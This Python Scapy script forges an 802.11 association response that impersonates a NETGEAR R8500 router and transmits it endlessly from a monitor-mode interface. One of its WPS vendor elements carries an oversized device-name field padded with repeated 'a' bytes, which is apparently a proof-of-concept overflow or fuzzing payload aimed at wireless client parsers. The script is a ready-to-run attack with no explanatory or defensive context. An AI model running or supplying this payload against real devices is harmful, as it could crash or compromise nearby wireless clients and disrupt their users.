#!/usr/bin/python
import sys
from scapy.all import *
probeResp = RadioTap()/Dot11(addr1="00:01:02:03:04:06", addr2="00:01:02:03:04:05", addr3="00:01:02:03:04:05")/Dot11AssoResp(cap='ESS+privacy+short-preamble+short-slot')/Dot11Elt(ID="SSID", info='NETGEAR64')/Dot11Elt(ID="Rates", info='\x82\x84\x8b\x96$0Hl')/Dot11Elt(ID="DSset", info="\x0b")/Dot11Elt(ID=7, info='US \x01\x0b\x1e')/Dot11Elt(ID="ERPinfo", info='\x06')/Dot11Elt(ID="ESRates", info='\x0c\x12\x18`')/Dot11Elt(ID="RSNinfo", info='\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x02\x0c\x00')/Dot11Elt(ID=11, info='\x00\x00\xdb\x00\x00')/Dot11Elt(ID=45, info='\xad\x01\x17\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')/Dot11Elt(ID=61, info='\x0b\x00\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')/Dot11Elt(ID=74, info='\x14\x00\n\x00,\x01\xc8\x00\x14\x00\x05\x00\x19\x00')/Dot11Elt(ID=127, info='\x04\x00\x00\x00\x00\x00\x00@')/Dot11Elt(ID=221, info='\x00P\xf2\x04\x10J\x00\x01\x10\x10D\x00\x01\x02\x10;\x00\x01\x03\x10G\x00\x10\xc2\xe5\x1a0\xc59\xf9\xff\xe5\xa8\xd2\xac\xd1\x8d\x9b\xf6\x10!\x00\rNETGEAR, Inc.\x10#\x00\x05R8500\x10$\x00\x05R8500\x10B\x00\x0232\x10T\x00\x08\x00\x06\x00P\xf2\x04\x00\x01\x10\x11\x00\x7daaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x10\x08\x00\x02 \x08\x10<\x00\x01\x03\x10I\x00\x06\x007*\x00\x01 ')/Dot11Elt(ID=221, info='\x00\x90L\x04\x18\xbf\x0c\xb2y\x83\x0f\xaa\xff\x00\x00\xaa\xff\x00\x00\xc0\x05\x00\x0b\x00\x00\x00\xc3\x02\x00\x02')/Dot11Elt(ID=221, info='\x00\x10\x18\x02\x00\x00\x1c\x00\x00')/Dot11Elt(ID=221, info="\x00P\xf2\x02\x01\x01\x80\x00\x03\xa4\x00\x00'\xa4\x00\x00BC^\x00b2/\x00")/Dot11Elt(ID=139, info='')
conf.iface = "wlan0mon"
sendp(probeResp,inter=.2,loop=1)